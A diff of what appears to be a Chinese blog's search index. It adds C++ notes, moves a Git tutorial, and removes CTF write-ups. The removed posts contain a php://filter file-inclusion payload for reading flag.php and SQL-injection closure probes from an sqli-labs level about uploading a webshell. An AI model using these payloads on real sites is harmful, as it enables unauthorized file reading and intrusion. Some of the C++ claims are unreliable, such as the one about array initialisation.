@@ -293,6 +293,33 @@
       </tags>
   </entry>
   <entry>
+    <title>C++小知识点整理</title>
+    <url>/2022/03/24/C-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/</url>
+    <content><![CDATA[<h1 id="保留固定位有效小数"><a href="#保留固定位有效小数" class="headerlink" title="保留固定位有效小数"></a>保留固定位有效小数</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span> <span class="comment">//关键头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;fixed&lt;&lt;<span class="built_in">setprecision</span>(<span class="number">3</span>)&lt;&lt;<span class="number">1</span>/<span class="number">3.0</span>&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里setprecision的括号里是保留几位有效小数，后面是三分之一，需要注意的是这里必须有一个整数带  .0  否则算出来为0</p>
+<p>一般会四舍五入，但有时候也会不执行，具体我也不知道啥原因</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span> <span class="comment">//关键头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;fixed&lt;&lt;<span class="built_in">setprecision</span>(<span class="number">3</span>)&lt;&lt;<span class="number">4.5535</span>&lt;&lt;endl;<span class="comment">//这样不会</span></span><br><span class="line">    cout&lt;&lt;fixed&lt;&lt;<span class="built_in">setprecision</span>(<span class="number">3</span>)&lt;&lt;<span class="number">4.55350</span>&lt;&lt;endl;<span class="comment">//这样不会</span></span><br><span class="line">    cout&lt;&lt;fixed&lt;&lt;<span class="built_in">setprecision</span>(<span class="number">3</span>)&lt;&lt;<span class="number">4.55351</span>&lt;&lt;endl;<span class="comment">//这样会</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="随机数的生成"><a href="#随机数的生成" class="headerlink" title="随机数的生成"></a>随机数的生成</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span> <span class="comment">//关键头文件 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctime&gt;</span> <span class="comment">//生成随机种子的关键头文件 </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line">	cout&lt;&lt;<span class="built_in">rand</span>()&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="built_in">rand</span>()%<span class="number">10</span>&lt;&lt;endl;<span class="comment">//随机生成0-9的实数 </span></span><br><span class="line">    cout&lt;&lt;<span class="built_in">rand</span>()%<span class="number">11</span>&lt;&lt;endl;<span class="comment">//随机生成0-10的实数 </span></span><br><span class="line">    cout&lt;&lt;<span class="built_in">rand</span>()%<span class="number">10</span>+<span class="number">2</span>&lt;&lt;endl;<span class="comment">//随机生成2-11的实数 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的头文件可以写cstdlib也可以写stdlib.h二者无太大区别ctime和time.h也是如此</p>
+<h1 id="array头文件的使用"><a href="#array头文件的使用" class="headerlink" title="array头文件的使用"></a>array头文件的使用</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;array&gt;</span><span class="comment">//关键函数 </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(array&lt;<span class="keyword">int</span>,<span class="number">3</span>&gt; a)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	array&lt;<span class="keyword">int</span>,3&gt; a;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a[i]=<span class="built_in">rand</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">show</span>(a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(array&lt;<span class="keyword">int</span>,<span class="number">3</span>&gt; a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;a[i]&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>特别需要注意的是，在定义函数时，括号里传入的值不能是<code>int a[]</code>，而应该是<code>array&lt;int,3&gt; a</code>这样函数才能够使用</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">array&lt;array&lt;<span class="keyword">int</span>,2&gt;,3&gt; a<span class="comment">//这表示3行2列矩阵</span></span><br></pre></td></tr></table></figure>
+
+<p>这个函数库再有就是可以整体赋值和交换矩阵以及输出矩阵元素个数</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">a.<span class="built_in">fill</span>(<span class="number">3</span>)<span class="comment">//表示把a中的元素都赋值为3</span></span><br><span class="line">array&lt;<span class="keyword">int</span>,4&gt; a=&#123;<span class="number">5</span>&#125;<span class="comment">//把a中的四个整型元素都赋值为5</span></span><br><span class="line">a.<span class="built_in">swap</span>(b)<span class="comment">//a b交换，这里的a b元素个数必须相同</span></span><br><span class="line">cout&lt;&lt;a.<span class="built_in">size</span>()<span class="comment">//输出a的元素个数</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="vector头文件的使用"><a href="#vector头文件的使用" class="headerlink" title="vector头文件的使用"></a>vector头文件的使用</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//vector: &lt;vector&gt;, 变长数组 </span></span><br><span class="line"><span class="comment">//常用操作：整体赋值,size(),push_back(),pop_back(),resize()</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showVector</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>(); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; v[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt; a;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;At the beginning, a.size() = &quot;</span> &lt;&lt; a.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a.<span class="built_in">push_back</span>(i*<span class="number">2</span>);</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;After i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; , a.size() = &quot;</span> &lt;&lt; a.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">showVector</span>(a);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a.<span class="built_in">pop_back</span>();</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;After i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; , a.size() = &quot;</span> &lt;&lt; a.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">showVector</span>(a);</span><br><span class="line">	</span><br><span class="line">	a.<span class="built_in">resize</span>(<span class="number">10</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;After a.resize(10): &quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">showVector</span>(a);</span><br><span class="line">	</span><br><span class="line">	a.<span class="built_in">resize</span>(<span class="number">3</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;After a.resize(3): &quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">showVector</span>(a);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C++数据类型及数据的运用</title>
     <url>/2021/12/08/C-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h1 id="C-程序初始代码"><a href="#C-程序初始代码" class="headerlink" title="C++程序初始代码"></a>C++程序初始代码</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -810,66 +837,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Git版本穿梭及版本比较</title>
-    <url>/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/</url>
-    <content><![CDATA[<h1 id="上节内容命令小结"><a href="#上节内容命令小结" class="headerlink" title="上节内容命令小结"></a>上节内容命令小结</h1><ul>
-<li><p>状态查看：<code>git status</code></p>
-</li>
-<li><p>添加操作：<code>git add 文件名.扩展名</code>（将工作区文件添加到暂存区）</p>
-</li>
-<li><p>提交操作：<code>git commit -m &quot;备注&quot; 文件名.扩展名</code>（将暂存区文件提交到本地库）</p>
-<span id="more"></span></li>
-</ul>
-<h1 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h1><p>查看历史版本：<code>git log</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094308532.png" alt="image-20220109094308532"></p>
-<p>简洁显示：<code>git log --pretty=oneline</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094600500.png" alt="image-20220109094600500"></p>
-<p>更简洁显示：<code>git log --oneline</code>（只显示后面版本）</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094753040.png" alt="image-20220109094753040"></p>
-<p>显示指针移动步数：<code>git reflog</code>更加详细的历史记录</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109095213452.png" alt="image-20220109095213452"></p>
-<p>HEAD@{移动到当前版本所需要步数}</p>
-<p>若版本信息有多屏</p>
-<p>则空格向下翻页，b向上翻页，q退出</p>
-<h1 id="版本前进后退"><a href="#版本前进后退" class="headerlink" title="版本前进后退"></a>版本前进后退</h1><h2 id="基于索引值操作-推荐"><a href="#基于索引值操作-推荐" class="headerlink" title="基于索引值操作[推荐]"></a>基于索引值操作[推荐]</h2><p>命令：<code>git reset ---hard 开头哈希值（索引值）</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109100709122.png" alt="image-20220109100709122"></p>
-<p>选中了即复制了，直接右键Paste粘贴即可，前进后退都一样</p>
-<h2 id="使用-或-符号"><a href="#使用-或-符号" class="headerlink" title="使用^或~符号"></a>使用^或~符号</h2><p>只能往后退，不能往前</p>
-<p>命令：<code>git reset --hard HEAD^</code>（退一个版本）  <code>git reset --HEAD^^</code>（向后退两个版本）</p>
-<p>有几个”^“就退几个版本，或者<code>git reset --hard HEAD~n</code>后退n步</p>
-<h2 id="soft、mixed、hard参数的区别"><a href="#soft、mixed、hard参数的区别" class="headerlink" title="soft、mixed、hard参数的区别"></a>soft、mixed、hard参数的区别</h2><p>soft参数（不常用）：仅仅移动本地库指针（不改变本地库数据）</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111029305.png" alt="image-20220110111029305"></p>
-<p>mixed参数（不常用）：在本地库移动指针并且重置暂存区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111040189.png" alt="image-20220110111040189"></p>
-<p>hard参数：在本地库移动指针、重置暂存区、重置工作区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111056667.png" alt="image-20220110111056667"></p>
-<h1 id="永久删除文件后找回"><a href="#永久删除文件后找回" class="headerlink" title="永久删除文件后找回"></a>永久删除文件后找回</h1><p>创建一个新文件</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111643932.png" alt="image-20220110111643932"></p>
-<p>删除文件指令：<code>rm 文件名.扩展名</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111832475.png" alt="image-20220110111832475"></p>
-<p>现在状态为</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111909833.png" alt="image-20220110111909833"></p>
-<p>若想要恢复，即输入 <code>git add delete.txt</code>和<code>git commit -m &quot;备注&quot; delete.txt</code>来确定删除</p>
-<p>记录不可磨灭（除非删除本地库），所以可根据记录找回删除文件</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113009537.png" alt="image-20220110113009537"></p>
-<h1 id="添加到暂存区的删除文件找回"><a href="#添加到暂存区的删除文件找回" class="headerlink" title="添加到暂存区的删除文件找回"></a>添加到暂存区的删除文件找回</h1><p>新建文件，并提交到本地库</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113802079.png" alt="image-20220110113802079"></p>
-<p>然后删除文件，并添加到暂存区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113841345.png" alt="image-20220110113841345"></p>
-<p>若要找回此文件，则输入指令：<code>git reset --hard HEAD</code>(本质仍然是版本回归)</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110114018441.png" alt="image-20220110114018441"></p>
-<p><strong><u>总结：删除文件找回的前提是，删除前文件存在时的状态提交到了本地库</u></strong></p>
-<h1 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h1><p>命令：<code>git diff 文件名.拓展名</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191213839.png" alt="image-20220110191213839"></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
-<p>上图表示第一行删去了9个a</p>
-<p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
-]]></content>
-      <tags>
-        <tag>Git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Git的分支管理级Git的基本原理</title>
     <url>/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
     <content><![CDATA[<h1 id="分支的意义"><a href="#分支的意义" class="headerlink" title="分支的意义"></a>分支的意义</h1><ul>
@@ -928,6 +895,66 @@
 <p>当分支文件不一样时，才会出现分支</p>
 <p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111122101487.png" alt="image-20220111122101487"></p>
 <p><strong>Git在本地的版本控制就完结了</strong></p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Git版本穿梭及版本比较</title>
+    <url>/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/</url>
+    <content><![CDATA[<h1 id="上节内容命令小结"><a href="#上节内容命令小结" class="headerlink" title="上节内容命令小结"></a>上节内容命令小结</h1><ul>
+<li><p>状态查看：<code>git status</code></p>
+</li>
+<li><p>添加操作：<code>git add 文件名.扩展名</code>（将工作区文件添加到暂存区）</p>
+</li>
+<li><p>提交操作：<code>git commit -m &quot;备注&quot; 文件名.扩展名</code>（将暂存区文件提交到本地库）</p>
+<span id="more"></span></li>
+</ul>
+<h1 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h1><p>查看历史版本：<code>git log</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094308532.png" alt="image-20220109094308532"></p>
+<p>简洁显示：<code>git log --pretty=oneline</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094600500.png" alt="image-20220109094600500"></p>
+<p>更简洁显示：<code>git log --oneline</code>（只显示后面版本）</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094753040.png" alt="image-20220109094753040"></p>
+<p>显示指针移动步数：<code>git reflog</code>更加详细的历史记录</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109095213452.png" alt="image-20220109095213452"></p>
+<p>HEAD@{移动到当前版本所需要步数}</p>
+<p>若版本信息有多屏</p>
+<p>则空格向下翻页，b向上翻页，q退出</p>
+<h1 id="版本前进后退"><a href="#版本前进后退" class="headerlink" title="版本前进后退"></a>版本前进后退</h1><h2 id="基于索引值操作-推荐"><a href="#基于索引值操作-推荐" class="headerlink" title="基于索引值操作[推荐]"></a>基于索引值操作[推荐]</h2><p>命令：<code>git reset ---hard 开头哈希值（索引值）</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109100709122.png" alt="image-20220109100709122"></p>
+<p>选中了即复制了，直接右键Paste粘贴即可，前进后退都一样</p>
+<h2 id="使用-或-符号"><a href="#使用-或-符号" class="headerlink" title="使用^或~符号"></a>使用^或~符号</h2><p>只能往后退，不能往前</p>
+<p>命令：<code>git reset --hard HEAD^</code>（退一个版本）  <code>git reset --HEAD^^</code>（向后退两个版本）</p>
+<p>有几个”^“就退几个版本，或者<code>git reset --hard HEAD~n</code>后退n步</p>
+<h2 id="soft、mixed、hard参数的区别"><a href="#soft、mixed、hard参数的区别" class="headerlink" title="soft、mixed、hard参数的区别"></a>soft、mixed、hard参数的区别</h2><p>soft参数（不常用）：仅仅移动本地库指针（不改变本地库数据）</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111029305.png" alt="image-20220110111029305"></p>
+<p>mixed参数（不常用）：在本地库移动指针并且重置暂存区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111040189.png" alt="image-20220110111040189"></p>
+<p>hard参数：在本地库移动指针、重置暂存区、重置工作区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111056667.png" alt="image-20220110111056667"></p>
+<h1 id="永久删除文件后找回"><a href="#永久删除文件后找回" class="headerlink" title="永久删除文件后找回"></a>永久删除文件后找回</h1><p>创建一个新文件</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111643932.png" alt="image-20220110111643932"></p>
+<p>删除文件指令：<code>rm 文件名.扩展名</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111832475.png" alt="image-20220110111832475"></p>
+<p>现在状态为</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111909833.png" alt="image-20220110111909833"></p>
+<p>若想要恢复，即输入 <code>git add delete.txt</code>和<code>git commit -m &quot;备注&quot; delete.txt</code>来确定删除</p>
+<p>记录不可磨灭（除非删除本地库），所以可根据记录找回删除文件</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113009537.png" alt="image-20220110113009537"></p>
+<h1 id="添加到暂存区的删除文件找回"><a href="#添加到暂存区的删除文件找回" class="headerlink" title="添加到暂存区的删除文件找回"></a>添加到暂存区的删除文件找回</h1><p>新建文件，并提交到本地库</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113802079.png" alt="image-20220110113802079"></p>
+<p>然后删除文件，并添加到暂存区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113841345.png" alt="image-20220110113841345"></p>
+<p>若要找回此文件，则输入指令：<code>git reset --hard HEAD</code>(本质仍然是版本回归)</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110114018441.png" alt="image-20220110114018441"></p>
+<p><strong><u>总结：删除文件找回的前提是，删除前文件存在时的状态提交到了本地库</u></strong></p>
+<h1 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h1><p>命令：<code>git diff 文件名.拓展名</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191213839.png" alt="image-20220110191213839"></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
+<p>上图表示第一行删去了9个a</p>
+<p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
 ]]></content>
       <tags>
         <tag>Git</tag>
@@ -1968,30 +1995,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php://filter 协议</title>
-    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
-<p><strong>1</strong>是格式<br><strong>2</strong>是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br><strong>3</strong>是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br><strong>4</strong>是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
-<span id="more"></span>
-
-<p>转base64编码：<code>convert.base64-encode</code></p>
-<p>转大写：<code>string.toupper</code></p>
-<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
-<p>例题：</p>
-<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
-<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
-<p>构造：<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
-<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
-<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
-]]></content>
-      <tags>
-        <tag>php协议</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>scrabble的使用</title>
     <url>/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h1 id="scrabble介绍"><a href="#scrabble介绍" class="headerlink" title="scrabble介绍"></a>scrabble介绍</h1><p>scrabble适用常规的git泄露，用于获取源码。开发人员忘记.git文件，导致攻击者可以通过.git文件夹中的信息获取开发人员所提交过的源码。</p>
@@ -2023,54 +2026,27 @@
       </tags>
   </entry>
   <entry>
-    <title>sqlilabs第7关（上传木马）</title>
-    <url>/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/</url>
-    <content><![CDATA[<h1 id="配置关卡文件"><a href="#配置关卡文件" class="headerlink" title="配置关卡文件"></a>配置关卡文件</h1><p>首先，MySQL默认是不能通过sql上传文件的，具体请输入命令<code>show variables like &#39;%secure%&#39;</code> 查看</p>
-<p>若图中划红线的框为</p>
-<ul>
-<li><p>Null  不可上传</p>
-</li>
-<li><p>某一路径 只能在该路径及其子路径中上传</p>
-</li>
-<li><p>空   可以上传</p>
-<span id="more"></span></li>
-</ul>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124202815420.png" alt="image-20220124202815420"></p>
-<p>具体修改方法如下</p>
-<p>打开my.ini文件，并在[mysqld]栏中添加如下内容</p>
-<p><code>secure_file_priv=&quot;路径&quot;</code></p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124203529805.png" alt="image-20220124203529805"></p>
-<p>然后重启MySQL即可生效。</p>
-<p>以上步骤实际上是完善题目，因为此题本来就是用上传文件做，没法上传文件就是没法做。</p>
-<h1 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h1><p>首先输入<code>id=1&#39;</code>，报错；然后输入<code>id=1&#39;--+</code>，还是报错；接着输入<code>id=1&#39;)--+</code>，还是报错；最后尝试输入<code>id=1&#39;))--+</code>，这次终于对了，所以闭合方式就是单引号加双括号。</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204428285.png" alt="image-20220124204428285"></p>
